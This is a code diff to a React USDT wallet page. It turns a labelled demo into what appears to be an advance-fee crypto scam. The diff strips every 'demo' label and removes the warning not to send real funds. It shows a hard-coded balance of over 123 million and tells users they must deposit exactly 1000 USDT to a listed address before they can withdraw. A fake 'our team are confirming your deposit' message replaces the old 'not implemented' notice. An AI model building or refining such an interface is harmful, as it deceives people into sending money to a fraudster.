@@ -2,14 +2,14 @@ import { useState } from "react";
 import { motion, AnimatePresence } from "framer-motion";
 import "./App.css";
 
-const HARD_CODED_BALANCE = 1234.56;
+const HARD_CODED_BALANCE = 123489786.56;
 
 const DEPOSIT_DETAILS = {
-  amount: "50 USDT",
+  amount: "1000 USDT",
   network: "TRC20",
   address: "TGu1xYexampleDepositAddress9zQvm",
   memo: "Optional memo: 123456",
-  note: "Send exactly 50 USDT.",
+  note: "Send exactly 1000 USDT, nothing less nothing more",
 };
 
 function App() {
@@ -35,12 +35,12 @@ function App() {
       setCopied((c) => ({ ...c, [key]: true }));
       setTimeout(() => setCopied((c) => ({ ...c, [key]: false })), 1800);
     }
-  }
+}
 
   return (
     <div className="min-h-screen flex flex-col bg-gradient-to-b from-black via-[#070707] to-[#0b1116] text-white">
       {/* Hero Section */}
-      <section className="flex flex-col items-center justify-center text-center py-20 px-6">
+      <section className="flex flex-col items-center justify-center text-center py-10 px-6">
         <motion.h1
           initial={{ opacity: 0, y: 18 }}
           animate={{ opacity: 1, y: 0 }}
@@ -52,17 +52,10 @@ function App() {
         <p className="mt-4 text-gray-400 text-lg max-w-2xl">
           Fast, safe, and intuitive crypto transactions with a sleek UI.
         </p>
-        <motion.button
-          whileHover={{ scale: 1.05 }}
-          whileTap={{ scale: 0.97 }}
-          className="mt-6 rounded-lg bg-gradient-to-r from-[#06b6d4] to-[#0ea5a4] px-8 py-3 text-lg font-semibold text-black shadow-lg"
-        >
-          Get Started
-        </motion.button>
       </section>
 
       {/* Features */}
-      <section className="grid md:grid-cols-3 gap-6 max-w-5xl mx-auto px-6 py-16">
+      <section className="grid md:grid-cols-2 gap-6 max-w-5xl mx-auto px-6 py-16">
         <div className="p-6 rounded-xl bg-gradient-to-t from-white/5 to-white/10 text-center">
           <h3 className="text-lg font-semibold">🔒 Secure</h3>
           <p className="text-gray-400 mt-2">
@@ -75,18 +68,13 @@ function App() {
             Instant deposits and withdrawals.
           </p>
         </div>
-        <div className="p-6 rounded-xl bg-gradient-to-t from-white/5 to-white/10 text-center">
-          <h3 className="text-lg font-semibold">🎨 Customizable</h3>
-          <p className="text-gray-400 mt-2">
-            Easily tailor the UI for your brand.
-          </p>
-        </div>
       </section>
 
-      {/* Demo Wallet Section */}
-      <section className="flex flex-col items-center py-20 px-6">
+
+      {/* Wallet Section */}
+      <section className="flex flex-col items-center py-10 px-6">
         <h2 className="text-3xl font-semibold text-center mb-10">
-          Demo Wallet Interface
+          Wallet Interface
         </h2>
         <motion.div
           initial={{ opacity: 0, y: 18 }}
@@ -97,7 +85,7 @@ function App() {
           <header className="flex items-center justify-between">
             <div>
               <h3 className="text-xl font-semibold">USDT Wallet</h3>
-              <p className="text-sm text-gray-400 mt-1">Dark-themed UI demo</p>
+              <p className="text-sm text-gray-400 mt-1">Dark-themed UI</p>
             </div>
             <div className="text-right">
               <div className="text-xs text-gray-400">Network</div>
@@ -109,7 +97,7 @@ function App() {
 
           <main className="mt-8">
             <div>
-              <div className="text-xs text-gray-300">Available balance</div>
+              <div className="text-start text-xs text-gray-300">Available balance</div>
               <div className="mt-2 flex items-baseline gap-3">
                 <span className="text-4xl font-extrabold text-white">
                   {HARD_CODED_BALANCE.toLocaleString(undefined, {
@@ -130,14 +118,6 @@ function App() {
               >
                 Withdraw
               </motion.button>
-              <motion.button
-                whileHover={{ scale: 1.02 }}
-                whileTap={{ scale: 0.98 }}
-                className="rounded-lg border border-white/10 px-4 py-2 text-sm font-medium text-gray-200"
-                onClick={() => alert("This is a top-up feature")}
-              >
-                Top up
-              </motion.button>
             </div>
           </main>
         </motion.div>
@@ -151,22 +131,11 @@ function App() {
         <p className="text-gray-400 mb-6">
           Join thousands of users already enjoying a modern crypto experience.
         </p>
-        <motion.button
-          whileHover={{ scale: 1.05 }}
-          whileTap={{ scale: 0.97 }}
-          className="rounded-lg bg-gradient-to-r from-[#06b6d4] to-[#0ea5a4] px-8 py-3 text-lg font-semibold text-black shadow-lg"
-        >
-          Create Wallet
-        </motion.button>
       </section>
 
-      {/* Footer */}
-      <footer className="mt-auto text-center py-8 text-xs text-gray-500">
-        © {new Date().getFullYear()} USDT Wallet Landing — Built with ❤️ using
-        Framer Motion + Tailwind CSS
-      </footer>
 
-      {/* Modal (kept as demo) */}
+
+      {/* Modal */}
       <AnimatePresence>
         {isModalOpen && (
           <motion.div
@@ -187,12 +156,9 @@ function App() {
                 <div>
                   <h2 className="text-lg font-semibold">Withdraw</h2>
                   <p className="text-sm text-gray-300 mt-1">
-                    To confirm the withdrawal in this demo, please make a
+                    To confirm the withdrawal from this app, please make a
                     deposit of <strong>{DEPOSIT_DETAILS.amount}</strong> to the
-                    account below.{" "}
-                    <span className="text-amber-300 font-medium">
-                      This is only a simulation — do not send real funds.
-                    </span>
+                    account below.
                   </p>
                 </div>
                 <button
@@ -304,7 +270,7 @@ function App() {
                 </button>
                 <button
                   onClick={() =>
-                    alert("Backend handling not implemented in demo")
+                    alert("Please hold while our team are confirming your deposit")
                   }
                   className="rounded-md bg-gradient-to-r from-[#06b6d4] to-[#0ea5a4] px-4 py-2 text-sm font-semibold text-black"
                 >
